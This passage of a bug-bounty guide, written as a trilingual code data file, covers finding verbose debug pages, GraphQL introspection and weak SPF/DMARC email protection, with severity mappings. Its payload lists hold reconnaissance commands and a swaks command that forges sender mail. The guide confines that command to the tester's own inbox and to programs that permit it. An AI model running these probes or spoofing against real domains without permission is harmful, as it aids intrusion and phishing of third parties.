        cvssSeverity: "Medium (automatic enumeration); Low for manual",
        note: {
          en: "P3 when image→user correlation is automatable (sequential ids / enumerable API). Drops to P4 for manual user enumeration. Only exists when the server doesn't transcode uploads.",
          simple: "P3 when image→user correlation can be automated (sequential ids / enumerable API). Drops to P4 for manual user enumeration. Only exists when the server doesn't transcode uploads.",
          hi: "P3 जब image→user correlation automate हो सके (sequential ids / enumerable API)। manual user enumeration के लिए P4 पर गिरता है। सिर्फ़ तब मौजूद होता है जब server uploads को transcode नहीं करता।",
        },
      },
      checklistCategoryId: "recon-content",
      references: [
        { label: "ExifTool", url: "https://exiftool.org/" },
        { label: "OWASP WSTG: Metadata exposure", url: "https://owasp.org/www-project-web-security-testing-guide/" },
      ],
    },
    {
      id: "verbose-errors-debug",
      name: "Verbose Errors, Debug Pages & GraphQL Introspection",
      emoji: "🧾",
      intro: {
        en: "Internals the server should never expose to a client: detailed stack traces and framework debug pages (Flask/Django DEBUG=True, Rails, Symfony, ASP.NET yellow screens) that reveal file paths, library versions, SQL fragments, env vars and sometimes secrets; and GraphQL introspection left on, which hands over the entire schema — every type, field, mutation and argument. Both are low-severity on their own (P4 for a detailed debug/config page, P5 for introspection), but their true worth is as a force multiplier for the rest of your hunt: a leaked framework version pinpoints a known-CVE path, a stack trace with a SQL fragment confirms an injection point, and a full GraphQL schema maps hidden mutations that drive IDOR/auth testing. Findability is a handful of malformed inputs and one introspection query.",
        simple: "Internals the server should never show a client: detailed stack traces and framework debug pages (Flask/Django DEBUG=True, Rails, Symfony, ASP.NET yellow screens) that reveal file paths, library versions, SQL fragments, env vars and sometimes secrets; and GraphQL introspection left on, which hands over the entire schema — every type, field, mutation and argument. Both are low-severity on their own (P4 for a detailed debug/config page, P5 for introspection), but their real worth is as a force multiplier for the rest of your hunt: a leaked framework version pinpoints a known-CVE path, a stack trace with a SQL fragment confirms an injection point, and a full GraphQL schema maps hidden mutations that drive IDOR/auth testing. It's found with a handful of malformed inputs and one introspection query.",
        hi: "ऐसे internals जो server को कभी किसी client को नहीं दिखाने चाहिए: detailed stack traces और framework debug pages (Flask/Django DEBUG=True, Rails, Symfony, ASP.NET yellow screens) जो file paths, library versions, SQL fragments, env vars और कभी secrets उजागर करते हैं; और GraphQL introspection चालू छूट जाना, जो पूरा schema सौंप देता है — हर type, field, mutation और argument। दोनों अकेले low-severity हैं (detailed debug/config page के लिए P4, introspection के लिए P5), पर इनकी असली क़ीमत बाक़ी hunt के लिए force multiplier के रूप में है: एक leak हुआ framework version किसी known-CVE path को पक्का करता है, SQL fragment वाला stack trace किसी injection point की पुष्टि करता है, और पूरा GraphQL schema छुपे mutations को map करता है जो IDOR/auth testing चलाते हैं। इसे कुछ malformed inputs और एक introspection query से ढूँढा जाता है।",
      },
      howToFind: [
        {
          title: {
            en: "Trigger and read verbose errors",
            simple: "Trigger and read verbose errors",
            hi: "verbose errors trigger करके पढ़ें",
          },
          steps: [
            {
              en: "Coax type-confusion / parser errors: send an array where a scalar is expected (?id[]=1), malformed JSON, a bad Content-Type, oversized or wrong-typed params, and an unhandled path.",
              simple: "Force type-confusion / parser errors: send an array where a scalar is expected (?id[]=1), malformed JSON, a bad Content-Type, oversized or wrong-typed params, and an unhandled path.",
              hi: "type-confusion / parser errors निकलवाएँ: जहाँ scalar अपेक्षित हो वहाँ array भेजें (?id[]=1), malformed JSON, ग़लत Content-Type, oversized या wrong-typed params, और कोई unhandled path।",
            },
            {
              en: "Read what leaks: framework + version, absolute file paths, DB engine + query fragments, stack frames, and any config/env echoed in the trace — note anything that sharpens another test.",
              simple: "Read what leaks: framework + version, absolute file paths, DB engine + query fragments, stack frames, and any config/env echoed in the trace — note anything that helps another test.",
              hi: "जो leak हो उसे पढ़ें: framework + version, absolute file paths, DB engine + query fragments, stack frames, और trace में echo होता कोई भी config/env — जो कुछ किसी दूसरे test को धारदार बनाए उसे नोट करें।",
            },
            {
              en: "Sweep broadly with nuclei http/misconfiguration templates for exposed debug consoles (Werkzeug, Django, phpinfo, actuator).",
              simple: "Sweep broadly with nuclei http/misconfiguration templates for exposed debug consoles (Werkzeug, Django, phpinfo, actuator).",
              hi: "exposed debug consoles (Werkzeug, Django, phpinfo, actuator) के लिए nuclei http/misconfiguration templates से चौड़ा sweep करें।",
            },
          ],
        },
        {
          title: {
            en: "Probe GraphQL introspection",
            simple: "Probe GraphQL introspection",
            hi: "GraphQL introspection जाँचें",
          },
          steps: [
            {
              en: "Send a minimal __schema introspection query; a full type list back means introspection is enabled (P5), and fingerprint the engine with graphw00f.",
              simple: "Send a minimal __schema introspection query; a full type list coming back means introspection is enabled (P5), and fingerprint the engine with graphw00f.",
              hi: "एक minimal __schema introspection query भेजें; पूरी type list वापस आना मतलब introspection enabled है (P5), और engine को graphw00f से fingerprint करें।",
            },
            {
              en: "Use the recovered schema to enumerate mutations and sensitive fields — this is reconnaissance that feeds IDOR/auth/injection hunting, not a finding by itself.",
              simple: "Use the recovered schema to list mutations and sensitive fields — this is recon that feeds IDOR/auth/injection hunting, not a finding on its own.",
              hi: "मिले हुए schema से mutations और sensitive fields enumerate करें — यह reconnaissance है जो IDOR/auth/injection hunting को आगे बढ़ाता है, अपने आप में कोई finding नहीं।",
            },
            {
              en: "If introspection is disabled, note field-suggestion (clairvoyance) as the follow-up rather than reporting a dead end.",
              simple: "If introspection is disabled, note field-suggestion (clairvoyance) as the next step instead of reporting a dead end.",
              hi: "अगर introspection disabled है, तो dead end रिपोर्ट करने के बजाय field-suggestion (clairvoyance) को अगले कदम के तौर पर नोट करें।",
            },
          ],
        },
      ],
      payloads: [
        "curl -s 'https://api.target.com/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'",
        "graphw00f -d -t https://api.target.com/graphql   (engine fingerprint + introspection state)",
        "curl -s 'https://target/item?id[]=1'   (array where scalar expected → type-juggle stack trace)",
        "nuclei -u https://target -t http/misconfiguration/   (Werkzeug/Django/actuator/phpinfo debug surfaces)",
      ],
      example: {
        en: "An API returned a full Werkzeug interactive debugger on a 500, leaking the absolute source path, the installed framework version and a SQL fragment from the failing query. On its own a P4 detailed-debug-page finding — but the version matched a known deserialization CVE and the SQL fragment confirmed a second injection point, so it became the pivot for two higher-severity reports rather than the headline itself.",
        simple: "An API returned a full Werkzeug interactive debugger on a 500, leaking the absolute source path, the installed framework version and a SQL fragment from the failing query. On its own a P4 detailed-debug-page finding — but the version matched a known deserialization CVE and the SQL fragment confirmed a second injection point, so it became the pivot for two higher-severity reports rather than the headline.",
        hi: "एक API ने 500 पर पूरा Werkzeug interactive debugger लौटाया, जिसने absolute source path, installed framework version और fail होती query का एक SQL fragment leak कर दिया। अकेले यह एक P4 detailed-debug-page finding — पर version एक known deserialization CVE से match करता था और SQL fragment ने दूसरे injection point की पुष्टि की, तो यह headline बनने के बजाय दो higher-severity reports का pivot बन गया।",
      },
      mapping: {
        bugcrowdVrt: "Sensitive Data Exposure › Visible Detailed Error/Debug Page › Detailed Server Configuration",
        bugcrowdPriority: "P4",
        bugcrowdCvss: "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        hackeroneCwe: "CWE-209: Generation of Error Message Containing Sensitive Information",
        cvssSeverity: "Low → Informational",
        note: {
          en: "Detailed error/debug page = P4. GraphQL Introspection Enabled = P5 (CVSS AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N). Real value is as a multiplier: versions/paths/schema sharpen injection, CVE and IDOR hunting.",
          simple: "Detailed error/debug page = P4. GraphQL Introspection Enabled = P5 (CVSS AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N). The real value is as a multiplier: versions/paths/schema sharpen injection, CVE and IDOR hunting.",
          hi: "Detailed error/debug page = P4। GraphQL Introspection Enabled = P5 (CVSS AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)। असली क़ीमत एक multiplier के तौर पर है: versions/paths/schema injection, CVE और IDOR hunting को धारदार बनाते हैं।",
        },
      },
      checklistCategoryId: "recon-content",
      references: [
        { label: "PortSwigger: Information disclosure", url: "https://portswigger.net/web-security/information-disclosure" },
        { label: "graphw00f (GraphQL fingerprint)", url: "https://github.com/dolevf/graphw00f" },
      ],
    },
    {
      id: "email-spoofing",
      name: "Email Spoofing (SPF / DMARC)",
      emoji: "✉️",
      intro: {
        en: "Missing or weak sender-authentication on a domain lets an attacker send mail that appears to come from it. The two layers matter independently: SPF/DKIM authorise sending hosts, while DMARC (with an enforcing policy) tells receivers to reject/quarantine mail that fails them. Bugcrowd grades on the resulting capability: a domain with no effective spoofing protection at all is P3, while a domain that has records but a non-enforcing DMARC policy (p=none) that still lets spoofed mail reach the inbox is P4. It is dropped as out-of-scope by many programs, so read scope.md first. Findability is pure DNS — three dig lookups — and the escalation edge is the domain's role: spoofing a transactional/login-notification sender feeds phishing and social-engineering chains far better than spoofing a parked domain.",
        simple: "Missing or weak sender-authentication on a domain lets an attacker send mail that looks like it comes from it. The two layers matter separately: SPF/DKIM authorise which hosts may send, while DMARC (with an enforcing policy) tells receivers to reject/quarantine mail that fails them. Bugcrowd grades on the resulting capability: a domain with no effective spoofing protection at all is P3, while a domain that has records but a non-enforcing DMARC policy (p=none) that still lets spoofed mail reach the inbox is P4. Many programs mark it out-of-scope, so read scope.md first. It's found with pure DNS — three dig lookups — and what escalates it is the domain's role: spoofing a transactional/login-notification sender feeds phishing and social-engineering chains far better than spoofing a parked domain.",
        hi: "किसी domain पर sender-authentication का न होना या कमज़ोर होना attacker को ऐसी mail भेजने देता है जो उसी से आई दिखे। दोनों layers अलग-अलग मायने रखती हैं: SPF/DKIM तय करते हैं कौन से hosts भेज सकते हैं, जबकि DMARC (एक enforcing policy के साथ) receivers को कहता है कि fail होने वाली mail reject/quarantine करें। Bugcrowd नतीजे की capability पर grade करता है: बिल्कुल भी असरदार spoofing protection न रखने वाला domain P3 है, जबकि ऐसा domain जिसके records तो हों पर non-enforcing DMARC policy (p=none) हो जो spoofed mail को फिर भी inbox तक पहुँचने दे, वह P4 है। कई programs इसे out-of-scope रखते हैं, इसलिए पहले scope.md पढ़ें। इसे pure DNS से ढूँढा जाता है — तीन dig lookups — और इसे escalate करने वाली बात है domain की भूमिका: किसी transactional/login-notification sender को spoof करना phishing और social-engineering chains को किसी parked domain के मुक़ाबले कहीं बेहतर feed करता है।",
      },
      howToFind: [
        {
          title: {
            en: "Read the DNS policy layers",
            simple: "Read the DNS policy layers",
            hi: "DNS policy layers पढ़ें",
          },
          steps: [
            {
              en: "SPF: dig TXT target.com — is there a v=spf1 record, and does it end in -all (hard fail), ~all (soft fail) or ?all/+all (effectively none)?",
              simple: "SPF: dig TXT target.com — is there a v=spf1 record, and does it end in -all (hard fail), ~all (soft fail) or ?all/+all (effectively none)?",
              hi: "SPF: dig TXT target.com — क्या कोई v=spf1 record है, और वो -all (hard fail), ~all (soft fail) या ?all/+all (असल में कुछ नहीं) पर ख़त्म होता है?",
            },
            {
              en: "DMARC: dig TXT _dmarc.target.com — p=reject/quarantine enforces; p=none (or no record) means spoofed mail is accepted to the inbox.",
              simple: "DMARC: dig TXT _dmarc.target.com — p=reject/quarantine enforces; p=none (or no record) means spoofed mail is accepted into the inbox.",
              hi: "DMARC: dig TXT _dmarc.target.com — p=reject/quarantine enforce करता है; p=none (या कोई record नहीं) मतलब spoofed mail inbox में accept हो जाती है।",
            },
            {
              en: "DKIM: check a likely selector (default._domainkey, google._domainkey) to see whether signing is even configured.",
              simple: "DKIM: check a likely selector (default._domainkey, google._domainkey) to see whether signing is even set up.",
              hi: "DKIM: किसी संभावित selector (default._domainkey, google._domainkey) को check करें ताकि पता चले कि signing configure भी है या नहीं।",
            },
            {
              en: "Classify: no SPF and no enforcing DMARC → P3; records present but p=none allowing inbox delivery → P4.",
              simple: "Classify: no SPF and no enforcing DMARC → P3; records present but p=none allowing inbox delivery → P4.",
              hi: "Classify करें: न SPF और न enforcing DMARC → P3; records मौजूद पर p=none जो inbox delivery होने दे → P4।",
            },
          ],
        },
        {
          title: {
            en: "Prove benignly, in scope and to yourself only",
            simple: "Prove it safely, in scope and only to yourself",
            hi: "सुरक्षित तरीक़े से साबित करें, scope में और सिर्फ़ ख़ुद को",
          },
          steps: [
            {
              en: "Only if the program allows email testing: send a single spoofed message from the domain to your OWN inbox and screenshot it landing with a passing/neutral authentication summary.",
              simple: "Only if the program allows email testing: send a single spoofed message from the domain to your OWN inbox and screenshot it arriving with a passing/neutral authentication summary.",
              hi: "सिर्फ़ तभी जब program email testing की इजाज़त दे: domain से एक अकेला spoofed message अपने ख़ुद के inbox में भेजें और उसे passing/neutral authentication summary के साथ आता हुआ screenshot करें।",
            },
            {
              en: "Never spoof mail to the program's users, staff, or any third party — the PoC recipient is always your own mailbox.",
              simple: "Never spoof mail to the program's users, staff, or any third party — the PoC recipient is always your own mailbox.",
              hi: "program के users, staff, या किसी third party को कभी spoofed mail न भेजें — PoC का recipient हमेशा आपका अपना mailbox हो।",
            },
            {
              en: "Report the exact records, the policy gap, and which sender role (transactional vs marketing vs parked) makes it dangerous.",
              simple: "Report the exact records, the policy gap, and which sender role (transactional vs marketing vs parked) makes it dangerous.",
              hi: "exact records, policy gap, और यह रिपोर्ट करें कि कौन सी sender role (transactional बनाम marketing बनाम parked) इसे ख़तरनाक बनाती है।",
            },
          ],
        },
      ],
      payloads: [
        "dig +short TXT target.com | grep -i spf   (present? and -all vs ~all vs ?all)",
        "dig +short TXT _dmarc.target.com   (p=none|quarantine|reject — none = spoofable to inbox)",
        "dig +short TXT default._domainkey.target.com   (DKIM selector configured?)",
        "swaks --to you@yourmail.com --from ceo@target.com --server <your-relay> --header 'Subject: spoof PoC'   (to your OWN inbox only, if in scope)",
      ],
      example: {
        en: "target.com published v=spf1 ... ~all (soft fail) and had no _dmarc record at all. A benign test message sent as billing@target.com to the hunter's own inbox arrived with no authentication enforcement — no effective spoofing protection on the email domain, P3. A sibling domain that did publish DMARC but at p=none (so spoofed mail still reached the inbox) was the P4 variant.",
        simple: "target.com published v=spf1 ... ~all (soft fail) and had no _dmarc record at all. A safe test message sent as billing@target.com to the hunter's own inbox arrived with no authentication enforcement — no effective spoofing protection on the email domain, P3. A sibling domain that did publish DMARC but at p=none (so spoofed mail still reached the inbox) was the P4 variant.",
        hi: "target.com ने v=spf1 ... ~all (soft fail) publish किया था और उसका कोई _dmarc record था ही नहीं। billing@target.com के तौर पर hunter के अपने inbox में भेजा गया एक benign test message बिना किसी authentication enforcement के पहुँच गया — email domain पर कोई असरदार spoofing protection नहीं, P3। एक sibling domain जिसने DMARC publish तो किया पर p=none पर (तो spoofed mail फिर भी inbox तक पहुँच गई) वह P4 variant था।",
      },
      mapping: {
        bugcrowdVrt: "Server Security Misconfiguration › Mail Server Misconfiguration › No Spoofing Protection on Email Domain",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
        hackeroneCwe: "CWE-358: Improperly Implemented Security Check for Standard (and CWE-290: Authentication Bypass by Spoofing)",
        cvssSeverity: "Medium (no SPF/DMARC at all); Low for DMARC-only spoof-to-inbox",
        note: {
          en: "No effective spoofing protection = P3. 'Email Spoofing to Inbox due to Missing or Misconfigured DMARC' (records present but p=none) = P4. Frequently out-of-scope — check scope.md before testing or reporting.",
          simple: "No effective spoofing protection = P3. 'Email Spoofing to Inbox due to Missing or Misconfigured DMARC' (records present but p=none) = P4. Often out-of-scope — check scope.md before testing or reporting.",
          hi: "कोई असरदार spoofing protection नहीं = P3। 'Email Spoofing to Inbox due to Missing or Misconfigured DMARC' (records मौजूद पर p=none) = P4। अक्सर out-of-scope — test या report करने से पहले scope.md check करें।",
        },
      },
      checklistCategoryId: "recon-email",
      references: [
        { label: "DMARC.org overview", url: "https://dmarc.org/overview/" },
        { label: "swaks (SMTP test tool)", url: "https://github.com/jetmore/swaks" },
      ],
    },
  ],
};
